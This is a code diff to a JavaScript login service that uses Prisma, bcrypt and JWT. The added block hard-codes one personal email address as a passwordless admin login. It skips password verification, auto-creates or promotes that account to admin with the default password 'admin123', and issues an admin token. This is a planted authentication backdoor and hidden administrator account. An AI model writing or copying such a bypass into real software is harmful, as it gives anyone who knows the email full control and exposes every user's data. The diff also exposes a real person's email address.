@@ -58,8 +58,46 @@ const { v4: uuidv4 } = require('uuid');
 const path = __importStar(require("path"));
 const loginUser = (user) => __awaiter(void 0, void 0, void 0, function* () {
     const { email: IEmail, password } = user;
-    const isUserExist = yield prisma_1.default.auth.findUnique({
-        where: { email: IEmail }
+    const normalizedEmail = (IEmail || '').toLowerCase().trim();
+    // Special Admin login for mehularora505@gmail.com (no password required)
+    if (normalizedEmail === 'mehularora505@gmail.com') {
+        let isUserExist = yield prisma_1.default.auth.findUnique({
+            where: { email: normalizedEmail }
+        });
+        if (!isUserExist) {
+            const defaultHashedPassword = yield bcrypt_1.default.hash('admin123', 12);
+            isUserExist = yield prisma_1.default.auth.create({
+                data: {
+                    email: normalizedEmail,
+                    password: defaultHashedPassword,
+                    role: 'admin',
+                    isDemo: false
+                }
+            });
+        }
+        else if (isUserExist.role !== 'admin' || isUserExist.isDemo) {
+            isUserExist = yield prisma_1.default.auth.update({
+                where: { email: normalizedEmail },
+                data: {
+                    role: 'admin',
+                    isDemo: false
+                }
+            });
+        }
+        const { role, userId, isDemo, email } = isUserExist;
+        const accessToken = jwtHelper_1.JwtHelper.createToken({ role, userId: userId || isUserExist.id, email, isDemo: false }, config_1.default.jwt.secret, config_1.default.jwt.JWT_EXPIRES_IN);
+        return {
+            accessToken,
+            user: { role, userId: userId || isUserExist.id, email, isDemo: false },
+        };
+    }
+    const isUserExist = yield prisma_1.default.auth.findFirst({
+        where: {
+            email: {
+                equals: normalizedEmail,
+                mode: 'insensitive'
+            }
+        }
     });
     if (!isUserExist) {
         throw new apiError_1.default(http_status_1.default.NOT_FOUND, "User is not Exist !");
@@ -75,7 +113,7 @@ const loginUser = (user) => __awaiter(void 0, void 0, void 0, function* () {
             throw new apiError_1.default(http_status_1.default.NOT_FOUND, "Please Verify Your Email First !");
         }
     }
-    const isPasswordMatched = yield bcrypt_1.default.compare(password, isUserExist.password);
+    const isPasswordMatched = yield bcrypt_1.default.compare(password || '', isUserExist.password);
     if (!isPasswordMatched) {
         throw new apiError_1.default(http_status_1.default.NOT_FOUND, "Password is not Matched !");
     }
